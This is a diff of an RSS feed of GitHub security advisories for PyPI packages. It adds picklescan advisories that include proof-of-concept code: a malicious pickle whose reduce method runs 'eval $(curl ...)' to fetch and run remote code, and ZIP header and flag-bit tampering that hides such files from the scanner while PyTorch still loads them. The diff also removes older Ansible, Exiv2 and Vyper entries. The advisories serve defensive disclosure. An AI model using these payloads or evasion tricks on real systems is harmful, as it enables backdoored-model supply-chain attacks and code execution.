@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2025-03-10T18:01:39.113Z</updated>
+    <updated>2025-03-10T19:01:24.215Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,213 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] Zip Exploit Crashes Picklescan But Not PyTorch ]]></title>
+        <id>https://github.com/advisories/GHSA-7q5r-7gvp-wc82</id>
+        <link href="https://github.com/advisories/GHSA-7q5r-7gvp-wc82"/>
+        <updated>2025-03-10T18:26:45.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>PickleScan is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.</p>
+<h3 id="details">Details</h3>
+<p>Python's built-in zipfile module performs strict integrity checks when extracting ZIP files. If a filename stored in the ZIP header does not match the filename in the directory listing, zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.</p>
+<p>PyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit this behavior to embed a malicious pickle file inside a model archive, which PyTorch will load, while preventing PickleScan from scanning the archive.</p>
+<h3 id="poc">PoC</h3>
+<pre><code>import os
+import torch
+
+class RemoteCodeExecution:
+    def __reduce__(self):
+        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)
+
+
+model = RemoteCodeExecution()
+file = "does_not_scan_but_opens_in_torch.pth"
+torch.save(model, file)
+
+# modify the header to cause the zip file to raise execution in picklescan
+with open(file, "rb") as f:
+    data = f.read()
+
+# Replace only the first occurrence of "data.pkl" with "datap.kl"
+modified_data = data.replace(b"data.pkl", b"datap.kl", 1)
+
+# Write back the modified content
+with open(file, "wb") as f:
+    f.write(modified_data)
+
+# Load the infected model
+torch.load(file)  
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Severity: <code>High</code></p>
+<ul>
+<li><p>Who is impacted? Any organization or individual using PickleScan to detect malicious pickle files in PyTorch models.</p>
+</li>
+<li><p>What is the impact? Attackers can embed malicious payloads inside PyTorch model archives while preventing PickleScan from scanning them.</p>
+</li>
+<li><p>Potential Exploits: This technique can be used in supply chain attacks to distribute backdoored models via platforms like Hugging Face.</p>
+</li>
+</ul>
+<h3 id="recommendations">Recommendations</h3>
+<ul>
+<li><p>Use a More Tolerant ZIP Parser: PickleScan should handle minor ZIP header inconsistencies more gracefully instead of failing outright.</p>
+</li>
+<li><p>Detect Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract valid files.</p>
+</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1944">https://nvd.nist.gov/vuln/detail/CVE-2025-1944</a></li>
+<li><a href="https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>
+<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944</a></li>
+<li><a href="https://github.com/advisories/GHSA-7q5r-7gvp-wc82">https://github.com/advisories/GHSA-7q5r-7gvp-wc82</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7q5r-7gvp-wc82</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-10T18:26:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] Zip Flag Bit Exploit Crashes Picklescan But Not PyTorch]]></title>
+        <id>https://github.com/advisories/GHSA-w8jq-xcqf-f792</id>
+        <link href="https://github.com/advisories/GHSA-w8jq-xcqf-f792"/>
+        <updated>2025-03-10T18:26:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>PickleScan fails to detect malicious pickle files inside PyTorch model archives when certain ZIP file flag bits are modified. By flipping specific bits in the ZIP file headers, an attacker can embed malicious pickle files that remain undetected by PickleScan while still being successfully loaded by PyTorch's torch.load(). This can lead to arbitrary code execution when loading a compromised model.</p>
+<h3 id="details">Details</h3>
+<p>PickleScan relies on Python’s zipfile module to extract and scan files within ZIP-based model archives. However, certain flag bits in ZIP headers affect how files are interpreted, and some of these bits cause PickleScan to fail while leaving PyTorch’s loading mechanism unaffected.</p>
+<p>By modifying the flag_bits field in the ZIP file entry, an attacker can:</p>
+<ul>
+<li>Embed a malicious pickle file (bad_file.pkl) in a PyTorch model archive.</li>
+<li>Flip specific bits (e.g., 0x1, 0x20, 0x40) in the ZIP metadata.</li>
+<li>Prevent PickleScan from scanning the archive due to errors raised by zipfile.</li>
+<li>Successfully load the model with torch.load(), which ignores the flag modifications.</li>
+</ul>
+<p>This technique effectively bypasses PickleScan's security checks while maintaining model functionality.</p>
+<h3 id="poc">PoC</h3>
+<pre><code>import os
+import zipfile
+import torch
+from picklescan import cli
+
+def can_scan(zip_file):
+    try:
+        cli.print_summary(False, cli.scan_file_path(zip_file))
+        return True
+    except Exception:
+        return False
+
+bit_to_flip = 0x1  # Change to 0x20 or 0x40 to test different flag bits
+
+zip_file = "model.pth"
+model = {'a': 1, 'b': 2, 'c': 3}
+torch.save(model, zip_file)
+
+with zipfile.ZipFile(zip_file, "r") as source:
+    flipped_name = f"flipped_{bit_to_flip}_{zip_file}"
+    with zipfile.ZipFile(flipped_name, "w") as dest:
+        bad_file = zipfile.ZipInfo("model/bad_file.pkl")
+        
+        # Modify the ZIP flag bits
+        bad_file.flag_bits |= bit_to_flip
+        
+        dest.writestr(bad_file, b"bad content")
+        for item in source.infolist():
+            dest.writestr(item, source.read(item.filename))
+
+if model == torch.load(flipped_name, weights_only=False):
+    if not can_scan(flipped_name):
+        print('Found exploitable bit:', bit_to_flip)
+else:
+    os.remove(flipped_name)
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Severity: <code>High</code></p>
+<ul>
+<li>Who is impacted? Any organization or user relying on PickleScan to detect malicious pickle files inside PyTorch models.</li>
+<li>What is the impact? Attackers can embed malicious pickle payloads inside PyTorch models that evade PickleScan's detection but still execute upon loading.</li>
+<li>Potential Exploits: This vulnerability could be exploited in machine learning supply chain attacks, allowing attackers to distribute backdoored models on platforms like Hugging Face or PyTorch Hub.</li>
+</ul>
+<h3 id="recommendations">Recommendations</h3>
+<ul>
+<li>Improve ZIP Handling: PickleScan should use a more relaxed ZIP parser marches on when encountering modified flag bits.</li>
+<li>Scan All Embedded Files Regardless of Flags: Ensure that files with altered metadata are still extracted and analyzed.</li>
+</ul>
+<p>By addressing these issues, PickleScan can provide stronger protection against manipulated PyTorch model archives.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1945">https://nvd.nist.gov/vuln/detail/CVE-2025-1945</a></li>
+<li><a href="https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>
+<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945</a></li>
+<li><a href="https://github.com/advisories/GHSA-w8jq-xcqf-f792">https://github.com/advisories/GHSA-w8jq-xcqf-f792</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w8jq-xcqf-f792</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-10T18:26:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Zip Flag Bit Exploit Crashes Picklescan But Not PyTorch]]></title>
+        <id>https://github.com/advisories/GHSA-2fh4-gpch-vqv4</id>
+        <link href="https://github.com/advisories/GHSA-2fh4-gpch-vqv4"/>
+        <updated>2025-03-10T18:31:04.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of GHSA-w8jq-xcqf-f792. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>picklescan before 0.0.23 fails to detect malicious pickle files inside PyTorch model archives when certain ZIP file flag bits are modified. By flipping specific bits in the ZIP file headers, an attacker can embed malicious pickle files that remain undetected by PickleScan while still being successfully loaded by PyTorch's torch.load(). This can lead to arbitrary code execution when loading a compromised model.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1945">https://nvd.nist.gov/vuln/detail/CVE-2025-1945</a></li>
+<li><a href="https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>
+<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945</a></li>
+<li><a href="https://github.com/advisories/GHSA-2fh4-gpch-vqv4">https://github.com/advisories/GHSA-2fh4-gpch-vqv4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2fh4-gpch-vqv4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-10T12:30:56.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Zip Exploit Crashes Picklescan But Not PyTorch ]]></title>
+        <id>https://github.com/advisories/GHSA-w6mr-mj53-x258</id>
+        <link href="https://github.com/advisories/GHSA-w6mr-mj53-x258"/>
+        <updated>2025-03-10T18:25:49.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of GHSA-7q5r-7gvp-wc82. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>picklescan before 0.0.23 is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1944">https://nvd.nist.gov/vuln/detail/CVE-2025-1944</a></li>
+<li><a href="https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>
+<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944</a></li>
+<li><a href="https://github.com/advisories/GHSA-w6mr-mj53-x258">https://github.com/advisories/GHSA-w6mr-mj53-x258</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w6mr-mj53-x258</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-10T12:30:55.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling]]></title>
         <id>https://github.com/advisories/GHSA-p3fp-8748-vqfq</id>
@@ -610,219 +817,5 @@ create_spotify_client()
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2025-02-25T17:48:34.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File]]></title>
-        <id>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</id>
-        <link href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"/>
-        <updated>2025-02-24T15:15:39.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8775">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2024-8775">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2312119">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2024:8969">https://access.redhat.com/errata/RHSA-2024:8969</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2024:9894">https://access.redhat.com/errata/RHSA-2024:9894</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2024:10762">https://access.redhat.com/errata/RHSA-2024:10762</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2025:1249">https://access.redhat.com/errata/RHSA-2025:1249</a></li>
-<li><a href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>
-<li><a href="https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>
-<li><a href="https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>
-<li><a href="https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-09-16T14:37:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File]]></title>
-        <id>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</id>
-        <link href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"/>
-        <updated>2025-02-24T15:15:39.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8775">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2024-8775">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2312119">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2024:8969">https://access.redhat.com/errata/RHSA-2024:8969</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2024:9894">https://access.redhat.com/errata/RHSA-2024:9894</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2024:10762">https://access.redhat.com/errata/RHSA-2024:10762</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2025:1249">https://access.redhat.com/errata/RHSA-2025:1249</a></li>
-<li><a href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>
-<li><a href="https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>
-<li><a href="https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>
-<li><a href="https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-09-16T14:37:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[Exiv2] Exiv2 allows Use After Free]]></title>
-        <id>https://github.com/advisories/GHSA-38h4-fx85-qcx7</id>
-        <link href="https://github.com/advisories/GHSA-38h4-fx85-qcx7"/>
-        <updated>2025-02-21T23:53:06.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A heap buffer overflow was found in Exiv2 versions v0.28.0 to v0.28.4. Versions prior to v0.28.0, such as v0.27.7, are <strong>not</strong> affected. Exiv2 is a command-line utility and C++ library for reading, writing, deleting, and modifying the metadata of image files. The heap overflow is triggered when Exiv2 is used to write metadata into a crafted image file. An attacker could potentially exploit the vulnerability to gain code execution, if they can trick the victim into running Exiv2 on a crafted image file.</p>
-<p>Note that this bug is only triggered when writing the metadata, which is a less frequently used Exiv2 operation than reading the metadata. For example, to trigger the bug in the Exiv2 command-line application, you need to add an extra command-line argument such as <code>fixiso</code>.</p>
-<h3 id="patches">Patches</h3>
-<p>The bug is fixed in version v0.28.5.</p>
-<h3 id="references">References</h3>
-<p>Issue: <a href="https://github.com/Exiv2/exiv2/issues/3168">https://github.com/Exiv2/exiv2/issues/3168</a>
-Fix: <a href="https://github.com/Exiv2/exiv2/pull/3174">https://github.com/Exiv2/exiv2/pull/3174</a></p>
-<h3 id="for-more-information">For more information</h3>
-<p>Please see our <a href="https://github.com/Exiv2/exiv2/security/policy">security policy</a> for information about Exiv2 security.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7">https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26623">https://nvd.nist.gov/vuln/detail/CVE-2025-26623</a></li>
-<li><a href="https://github.com/Exiv2/exiv2/issues/3168">https://github.com/Exiv2/exiv2/issues/3168</a></li>
-<li><a href="https://github.com/Exiv2/exiv2/pull/3174">https://github.com/Exiv2/exiv2/pull/3174</a></li>
-<li><a href="https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4">https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4</a></li>
-<li><a href="https://github.com/advisories/GHSA-38h4-fx85-qcx7">https://github.com/advisories/GHSA-38h4-fx85-qcx7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-38h4-fx85-qcx7</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-02-21T23:53:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vyper] Vyper has a double eval in For List Iter]]></title>
-        <id>https://github.com/advisories/GHSA-h33q-mhmp-8p67</id>
-        <link href="https://github.com/advisories/GHSA-h33q-mhmp-8p67"/>
-        <updated>2025-02-24T20:26:23.000Z</updated>
-        <content type="html"><![CDATA[<p>Multiple evaluation of a single expression is possible in the iterator target of a for loop. While the iterator expression cannot produce multiple writes, it can consume side effects produced in the loop body (e.g. read a storage variable updated in the loop body) and thus lead to unexpected program behavior. Specifically, reads in iterators which contain an ifexp (e.g. <code>for s: uint256 in ([read(), read()] if True else [])</code>) may interleave reads with writes in the loop body.</p>
-<p>The fix is tracked in <a href="https://github.com/vyperlang/vyper/pull/4488">https://github.com/vyperlang/vyper/pull/4488</a>.</p>
-<h3 id="vulnerability-details">Vulnerability Details</h3>
-<p>Vyper for loops allow two kinds of iterator targets, namely the <code>range()</code> builtin and an iterable type, like SArray and DArray. </p>
-<p>During codegen, iterable lists are required to not produce any side-effects (in the following code, <code>range_scope</code> forces <code>iter_list</code> to be parsed in a constant context, which is checked against <code>is_constant</code>).</p>
-<pre><code class="language-python">def _parse_For_list(self):
-    with self.context.range_scope():
-        iter_list = Expr(self.stmt.iter, self.context).ir_node
-    ...
-
-def range_scope(self):
-    prev_value = self.in_range_expr
-    self.in_range_expr = True
-    yield
-    self.in_range_expr = prev_value
-
-def is_constant(self):
-    return self.constancy is Constancy.Constant or self.in_range_expr
-</code></pre>
-<p>However, this does not prevent the iterator from consuming side effects provided by the body of the loop. For dynamic arrays, the compiler simply panics:</p>
-<pre><code class="language-vyper">x: DynArray[uint256, 3]
-
-@external
-def test():
-    for i: uint256 in (self.usesideeffect() if True else self.usesideeffect()):
-        pass
-
-@view
-def usesideeffect() -&gt; DynArray[uint256, 3]:
-    return self.x
-</code></pre>
-<p>For SArrays on the other hand, <code>iter_list</code> is instantiated in the body of a <code>repeat</code> ir, so it can be evaluated several times.</p>
-<p>Here are three illustrating examples. In the first example, the following test case pre-evaluates the iter list and stores the result to a temporary list in memory. So the list is only evaluated once, before entry into the loop body, and the log output will be 0, 0, 0.</p>
-<pre><code class="language-vyper">event I:
-    i: uint256
-
-x: uint256
-
-@deploy
-def __init__():
-    self.x = 0
-
-@external
-def test():
-    for i: uint256 in [self.usesideeffect(), self.usesideeffect(), self.usesideeffect()]:
-        self.x += 1
-        log I(i)
-
-@view
-def usesideeffect() -&gt; uint256:
-    return self.x
-</code></pre>
-<p>However, in the next two examples, because the iterator target is not a list literal, it will be evaluated in the loop body. In the second example, <code>iter_list</code> is an ifexp, thus it will be evaluated lazily in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>
-<pre><code class="language-vyper">event I:
-    i: uint256
-
-x: uint256
-
-@deploy
-def __init__():
-    self.x = 0
-
-@external
-def test():
-    for i: uint256 in ([self.usesideeffect(), self.usesideeffect(), self.usesideeffect()] if True else self.otherclause()):
-        self.x += 1
-        log I(i)
-
-@view
-def usesideeffect() -&gt; uint256:
-    return self.x
-
-@view
-def otherclause() -&gt; uint256[3]:
-    return [0, 0, 0]
-</code></pre>
-<p>In the third example, <code>iter_list</code> is also an ifexp, thus it will only be evaluated in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>
-<pre><code class="language-vyper">event I:
-    i: uint256
-
-x: uint256[3]
-
-@deploy
-def __init__():
-    self.x = [0, 0, 0]
-
-@external
-def test():
-    for i: uint256 in (self.usesideeffect() if True else self.otherclause()):
-        self.x[0] += 1
-        self.x[1] += 1
-        self.x[2] += 1
-        log I(i)
-
-@view
-def usesideeffect() -&gt; uint256[3]:
-    return self.x
-
-@view
-def otherclause() -&gt; uint256[3]:
-    return [0, 0, 0]
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67">https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67</a></li>
-<li><a href="https://github.com/vyperlang/vyper/pull/4488">https://github.com/vyperlang/vyper/pull/4488</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27104">https://nvd.nist.gov/vuln/detail/CVE-2025-27104</a></li>
-<li><a href="https://github.com/advisories/GHSA-h33q-mhmp-8p67">https://github.com/advisories/GHSA-h33q-mhmp-8p67</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h33q-mhmp-8p67</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-02-21T22:43:36.000Z</published>
     </entry>
 </feed>
